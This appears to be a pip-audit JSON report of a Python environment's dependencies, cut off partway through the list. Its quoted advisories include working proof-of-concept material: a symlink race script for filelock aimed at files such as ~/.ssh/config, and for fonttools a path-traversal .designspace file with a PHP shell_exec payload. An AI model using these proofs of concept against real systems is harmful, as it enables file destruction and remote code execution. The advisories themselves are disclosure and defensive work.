{"dependencies": [{"name": "absl-py", "version": "2.3.1", "vulns": []}, {"name": "accelerate", "version": "1.11.0", "vulns": []}, {"name": "aenum", "version": "3.1.15", "vulns": []}, {"name": "agno", "version": "2.4.7", "vulns": []}, {"name": "aioboto3", "version": "15.5.0", "vulns": []}, {"name": "aiobotocore", "version": "2.25.1", "vulns": []}, {"name": "aiofiles", "version": "24.1.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.13.2", "vulns": [{"id": "CVE-2025-69223", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6mq8-rvhq-8wgg"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "CVE-2025-69224", "fix_versions": ["3.13.3"], "aliases": ["GHSA-69f9-5gxw-wvc2"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "CVE-2025-69228", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6jhg-hg63-jvvf"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "CVE-2025-69229", "fix_versions": ["3.13.3"], "aliases": ["GHSA-g84x-mcqj-x9qq"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "CVE-2025-69230", "fix_versions": ["3.13.3"], "aliases": ["GHSA-fh55-r93g-j68g"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "CVE-2025-69226", "fix_versions": ["3.13.3"], "aliases": ["GHSA-54jq-c3m8-4m76"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "CVE-2025-69227", "fix_versions": ["3.13.3"], "aliases": ["GHSA-jj3x-wxrx-4x23"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "CVE-2025-69225", "fix_versions": ["3.13.3"], "aliases": ["GHSA-mqqc-3gqh-h2x8"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aioitertools", "version": "0.13.0", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.71.0", "vulns": []}, {"name": "antlr4-python3-runtime", "version": "4.13.2", "vulns": []}, {"name": "anyio", "version": "4.9.0", "vulns": []}, {"name": "appnope", "version": "0.1.4", "vulns": []}, {"name": "apscheduler", "version": "3.11.2", "vulns": []}, {"name": "apsw", "version": "3.51.1.0", "vulns": []}, {"name": "argilla", "version": "2.8.0", "vulns": []}, {"name": "argon2-cffi", "version": "25.1.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "25.1.0", "vulns": []}, {"name": "arrow", "version": "1.3.0", "vulns": []}, {"name": "arxiv", "version": "2.3.0", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "async-lru", "version": "2.0.5", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "audioop-lts", "version": "0.2.2", "vulns": []}, {"name": "av", "version": "13.1.0", "vulns": []}, {"name": "babe", "version": "0.0.7", "vulns": []}, {"name": "babel", "version": "2.17.0", "vulns": []}, {"name": "bandit", "version": "1.9.3", "vulns": []}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "beartype", "version": "0.14.1", "vulns": []}, {"name": "beautifulsoup4", "version": "4.14.2", "vulns": []}, {"name": "bertviz", "version": "1.4.1", "vulns": []}, {"name": "better-abc", "version": "0.0.3", "vulns": []}, {"name": "bitsandbytes", "version": "0.42.0", "vulns": []}, {"name": "black", "version": "25.9.0", "vulns": []}, {"name": "bleach", "version": "6.2.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.40.48", "vulns": []}, {"name": "botocore", "version": "1.40.48", "vulns": []}, {"name": "brotli", "version": "1.2.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "5.5.2", "vulns": []}, {"name": "certifi", "version": "2025.7.9", "vulns": []}, {"name": "cffi", "version": "1.17.1", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.3", "vulns": []}, {"name": "click", "version": "8.2.1", "vulns": []}, {"name": "cloup", "version": "3.0.8", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "colorlog", "version": "6.10.1", "vulns": []}, {"name": "comm", "version": "0.2.3", "vulns": []}, {"name": "config2py", "version": "0.1.45", "vulns": []}, {"name": "contourpy", "version": "1.3.3", "vulns": []}, {"name": "coverage", "version": "7.13.3", "vulns": []}, {"name": "cryptography", "version": "45.0.6", "vulns": []}, {"name": "cycler", "version": "0.12.1", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "cython", "version": "3.2.3", "vulns": []}, {"name": "dashscope", "version": "1.25.5", "vulns": []}, {"name": "dataproperty", "version": "1.1.0", "vulns": []}, {"name": "datasets", "version": "4.5.0", "vulns": []}, {"name": "debugpy", "version": "1.8.17", "vulns": []}, {"name": "decorator", "version": "5.2.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.2.18", "vulns": []}, {"name": "deprecation", "version": "2.1.0", "vulns": []}, {"name": "detect-secrets", "version": "1.5.0", "vulns": []}, {"name": "diffusers", "version": "0.36.0", "vulns": []}, {"name": "dill", "version": "0.4.0", "vulns": []}, {"name": "distilabel", "version": "1.5.3", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "docstring-parser", "version": "0.17.0", "vulns": []}, {"name": "dol", "version": "0.3.38", "vulns": []}, {"name": "easydict", "version": "1.13", "vulns": []}, {"name": "ebooklib", "version": "0.20", "vulns": []}, {"name": "einops", "version": "0.8.1", "vulns": []}, {"name": "evaluate", "version": "0.4.6", "vulns": []}, {"name": "executing", "version": "2.2.1", "vulns": []}, {"name": "faiss-cpu", "version": "1.12.0", "vulns": []}, {"name": "fancy-einsum", "version": "0.0.3", "vulns": []}, {"name": "fastapi", "version": "0.116.0", "vulns": []}, {"name": "fastjsonschema", "version": "2.21.2", "vulns": []}, {"name": "feedparser", "version": "6.0.12", "vulns": []}, {"name": "ffmpy", "version": "1.0.0", "vulns": []}, {"name": "filelock", "version": "3.18.0", "vulns": [{"id": "CVE-2025-68146", "fix_versions": ["3.20.1"], "aliases": ["GHSA-w853-jp5j-5j7f"], "description": "### Impact  A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks. The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? \u2192 False T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable? T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink/junction         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  ### Step-by-Step Attack Flow  **1. Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} \u2192 {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # \u2190 VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // \u2190 Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # \u2190 Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)"}, {"id": "CVE-2026-22701", "fix_versions": ["3.20.3"], "aliases": ["GHSA-qmgc-5h2g-mvrw"], "description": "## Vulnerability Summary  **Title:** Time-of-Check-Time-of-Use (TOCTOU) Symlink Vulnerability in SoftFileLock  **Affected Component:** `filelock` package - `SoftFileLock` class **File:** `src/filelock/_soft.py` lines 17-27 **CWE:** CWE-362, CWE-367, CWE-59  ---  ## Description  A TOCTOU race condition vulnerability exists in the `SoftFileLock` implementation of the filelock package. An attacker with local filesystem access and permission to create symlinks can exploit a race condition between the permission validation and file creation to cause lock operations to fail or behave unexpectedly.  The vulnerability occurs in the `_acquire()` method between `raise_on_not_writable_file()` (permission check) and `os.open()` (file creation). During this race window, an attacker can create a symlink at the lock file path, potentially causing the lock to operate on an unintended target file or leading to denial of service.  ### Attack Scenario  ``` 1. Lock attempts to acquire on /tmp/app.lock 2. Permission validation passes 3. [RACE WINDOW] - Attacker creates: ln -s /tmp/important.txt /tmp/app.lock 4. os.open() tries to create lock file 5. Lock operates on attacker-controlled target file or fails ```  ---  ## Impact  _What kind of vulnerability is it? Who is impacted?_  This is a **Time-of-Check-Time-of-Use (TOCTOU) race condition vulnerability** affecting any application using `SoftFileLock` for inter-process synchronization.  **Affected Users:** - Applications using `filelock.SoftFileLock` directly - Applications using the fallback `FileLock` on systems without `fcntl` support (e.g., GraalPy)  **Consequences:** - **Silent lock acquisition failure** - applications may not detect that exclusive resource access is not guaranteed - **Denial of Service** - attacker can prevent lock file creation by maintaining symlink - **Resource serialization failures** - multiple processes may acquire \"locks\" simultaneously - **Unintended file operations** - lock could operate on attacker-controlled files  **CVSS v4.0 Score:** 5.6 (Medium) **Vector:** CVSS:4.0/AV:L/AT:L/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N  **Attack Requirements:** - Local filesystem access to the directory containing lock files - Permission to create symlinks (standard for regular unprivileged users on Unix/Linux) - Ability to time the symlink creation during the narrow race window  ---  ## Patches  _Has the problem been patched? What versions should users upgrade to?_  Yes, the vulnerability has been patched by adding the `O_NOFOLLOW` flag to prevent symlink following during lock file creation.  **Patched Version:** Next release (commit: 255ed068bc85d1ef406e50a135e1459170dd1bf0)  **Mitigation Details:** - The `O_NOFOLLOW` flag is added conditionally and gracefully degrades on platforms without support - On platforms with `O_NOFOLLOW` support (most modern systems): symlink attacks are completely prevented - On platforms without `O_NOFOLLOW` (e.g., GraalPy): TOCTOU window remains but is documented  **Users should:** - Upgrade to the patched version when available - For critical deployments, consider using `UnixFileLock` or `WindowsFileLock` instead of the fallback `SoftFileLock`  ---  ## Workarounds  _Is there a way for users to fix or remediate the vulnerability without upgrading?_  For users unable to update immediately:  1. **Avoid `SoftFileLock` in security-sensitive contexts** - use `UnixFileLock` or `WindowsFileLock` when available (these were already patched for CVE-2025-68146)  2. **Restrict filesystem permissions** - prevent untrusted users from creating symlinks in lock file directories:    ```bash    chmod 700 /path/to/lock/directory    ```  3. **Use process isolation** - isolate untrusted code from lock file paths to prevent symlink creation  4. **Monitor lock operations** - implement application-level checks to verify lock acquisitions are successful before proceeding with critical operations  ---  ## References  _Are there any links users can visit to find out more?_  - **Similar Vulnerability:** CVE-2025-68146 (TOCTOU vulnerability in UnixFileLock/WindowsFileLock) - **CWE-362 (Concurrent Execution using Shared Resource):** https://cwe.mitre.org/data/definitions/362.html - **CWE-367 (Time-of-check Time-of-use Race Condition):** https://cwe.mitre.org/data/definitions/367.html - **CWE-59 (Improper Link Resolution Before File Access):** https://cwe.mitre.org/data/definitions/59.html - **O_NOFOLLOW documentation:** https://man7.org/linux/man-pages/man2/open.2.html - **GitHub Repository:** https://github.com/tox-dev/filelock  ---  **Reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "fonttools", "version": "4.59.0", "vulns": [{"id": "CVE-2025-66034", "fix_versions": ["4.60.2"], "aliases": ["GHSA-768j-98cg-p3fv"], "description": "## Summary  The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.  The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).  Overall this allows attackers to: - Write font files to arbitrary locations on the filesystem - Overwrite configuration files - Corrupt application files and dependencies - Obtain remote code execution  The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.  ## Affected Lines  `fontTools/varLib/__init__.py` ```python filename = vf.filename # Unsanitised filename output_path = os.path.join(output_dir, filename) # Path traversal vf.save(output_path) # Arbitrary file write ```  ## PoC 1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)  `setup.py` ```python #!/usr/bin/env python3 import os  from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen  def create_source_font(filename, weight=400):     fb = FontBuilder(unitsPerEm=1000, isTTF=True)     fb.setupGlyphOrder([\".notdef\"])     fb.setupCharacterMap({})          pen = TTGlyphPen(None)     pen.moveTo((0, 0))     pen.lineTo((500, 0))     pen.lineTo((500, 500))     pen.lineTo((0, 500))     pen.closePath()          fb.setupGlyf({\".notdef\": pen.glyph()})     fb.setupHorizontalMetrics({\".notdef\": (500, 0)})     fb.setupHorizontalHeader(ascent=800, descent=-200)     fb.setupOS2(usWeightClass=weight)     fb.setupPost()     fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})     fb.save(filename)  if __name__ == '__main__':     os.chdir(os.path.dirname(os.path.abspath(__file__)))     create_source_font(\"source-light.ttf\", weight=100)     create_source_font(\"source-regular.ttf\", weight=400) ```  `malicious.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\">   <axes>     <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>   </axes>      <sources>     <source filename=\"source-light.ttf\" name=\"Light\">       <location>         <dimension name=\"Weight\" xvalue=\"100\"/>       </location>     </source>     <source filename=\"source-regular.ttf\" name=\"Regular\">       <location>         <dimension name=\"Weight\" xvalue=\"400\"/>       </location>     </source>   </sources>      <!-- Filename can be arbitrarily set to any path on the filesystem -->   <variable-fonts>     <variable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\">       <axis-subsets>         <axis-subset name=\"Weight\"/>       </axis-subsets>     </variable-font>   </variable-fonts> </designspace> ```  Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.  2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file. ```bash python3 setup.py ``` 3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename ```bash fonttools varLib malicious.designspace ``` 4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace ```bash cat {{filename_location}} ``` 5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.  `malicious2.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\"> \t<axes>         <!-- XML injection occurs in labelname elements with CDATA sections --> \t    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"> \t        <labelname xml:lang=\"en\"><![CDATA[<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]]]><![CDATA[>]]></labelname> \t        <labelname xml:lang=\"fr\">MEOW2</labelname> \t    </axis> \t</axes> \t<axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/> \t<sources> \t\t<source filename=\"source-light.ttf\" name=\"Light\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"100\"/> \t\t\t</location> \t\t</source> \t\t<source filename=\"source-regular.ttf\" name=\"Regular\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"400\"/> \t\t\t</location> \t\t</source> \t</sources> \t<variable-fonts> \t\t<variable-font name=\"MyFont\" filename=\"output.ttf\"> \t\t\t<axis-subsets> \t\t\t\t<axis-subset name=\"Weight\"/> \t\t\t</axis-subsets> \t\t</variable-font> \t</variable-fonts> \t<instances> \t\t<instance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\"> \t\t\t<location><dimension name=\"Weight\" xvalue=\"100\"/></location> \t\t\t<labelname xml:lang=\"en\">Display Thin</labelname> \t\t</instance> \t</instances> </designspace> ```  6. When the program is run, we can show we control the contents in the new file ```bash fonttools varLib malicious2.designspace -o file123 ``` Here being outputted to a localised area ignoring filename presented in variable-font  7. We can look inside file123 to validate user controlled injection ```bash cat file123 ``` to show `<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]>`  8. Executing the file and reading looking at the newly generated file ```bash php file123 ls -la /tmp/MEOW123 ``` we can see that the file was just created showing RCE.  ## Recommendations  - Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system"}]}, {"name": "fqdn", "version": "1.5.1", "vulns": []}, {"name": "frozendict", "version": "2.4.7", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "fsspec", "version": "2025.5.1", "vulns": []}, {"name": "ftfy", "version": "6.3.1", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.46", "vulns": []}, {"name": "glcontext", "version": "3.0.0", "vulns": []}, {"name": "google-ai-generativelanguage", "version": "0.6.15", "vulns": []}, {"name": "google-api-core", "version": "2.25.1", "vulns": []}, {"name": "google-api-python-client", "version": "2.179.0", "vulns": []}, {"name": "google-auth", "version": "2.40.3", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.0", "vulns": []}, {"name": "google-generativeai", "version": "0.8.5", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.70.0", "vulns": []}, {"name": "gradio", "version": "6.2.0", "vulns": []}, {"name": "gradio-client", "version": "2.0.2", "vulns": []}, {"name": "graze", "version": "0.1.39", "vulns": []}, {"name": "grok4git", "skip_reason": "Dependency not found on PyPI and could not be audited: grok4git (1.1.1.dev4+gba677876d)"}, {"name": "groovy", "version": "0.1.2", "vulns": []}, {"name": "grpcio", "version": "1.74.0", "vulns": []}, {"name": "grpcio-status", "version": "1.71.2", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h2", "version": "4.3.0", "vulns": []}, {"name": "hf-xet", "version": "1.1.10", "vulns": []}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.22.0", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "0.35.3", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "hypothesis", "version": "6.151.5", "vulns": []}, {"name": "i2", "version": "0.1.63", "vulns": []}, {"name": "idna", "version": "3.10", "vulns": []}, {"name": "ijson", "version": "3.4.0.post0", "vulns": []}, {"name": "imageio", "version": "2.37.2", "vulns": []}, {"name": "imageio-ffmpeg", "version": "0.6.0", "vulns": []}, {"name": "img2pdf", "version": "0.6.1", "vulns": []}, {"name": "importlib-metadata", "version": "8.7.1", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "inquirerpy", "version": "0.3.4", "vulns": []}, {"name": "inspect-ai", "version": "0.3.163", "vulns": []}, {"name": "invoke", "version": "2.2.1", "vulns": []}, {"name": "ipykernel", "version": "6.30.1", "vulns": []}, {"name": "ipython", "version": "9.6.0", "vulns": []}, {"name": "ipython-pygments-lexers", "version": "1.1.1", "vulns": []}, {"name": "ipywidgets", "version": "8.1.7", "vulns": []}, {"name": "isoduration", "version": "20.11.0", "vulns": []}, {"name": "isosurfaces", "version": "0.1.2", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaxtyping", "version": "0.3.5", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.10.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "json5", "version": "0.12.1", "vulns": []}, {"name": "jsonlines", "version": "4.0.0", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpath-ng", "version": "1.7.0", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonref", "version": "1.1.0", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "jupyter", "version": "1.1.1", "vulns": []}, {"name": "jupyter-client", "version": "8.6.3", "vulns": []}, {"name": "jupyter-console", "version": "6.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.8.1", "vulns": []}, {"name": "jupyter-events", "version": "0.12.0", "vulns": []}, {"name": "jupyter-lsp", "version": "2.3.0", "vulns": []}, {"name": "jupyter-server", "version": "2.17.0", "vulns": []}, {"name": "jupyter-server-terminals", "version": "0.5.3", "vulns": []}, {"name": "jupyterlab", "version": "4.4.9", "vulns": []}, {"name": "jupyterlab-pygments", "version": "0.3.0", "vulns": []}, {"name": "jupyterlab-server", "version": "2.27.3", "vulns": []}, {"name": "jupyterlab-widgets", "version": "3.0.15", "vulns": []}, {"name": "kiwisolver", "version": "1.4.9", "vulns": []}, {"name": "langcodes", "version": "3.5.1", "vulns": []}, {"name": "lark", "version": "1.3.0", "vulns": []}, {"name": "latex2sympy2-extended", "version": "1.0.6", "vulns": []}, {"name": "latexmk", "version": "0.0.2", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "lighteval", "version": "0.13.0", "vulns": []}, {"name": "linkify-it-py", "version": "2.0.3", 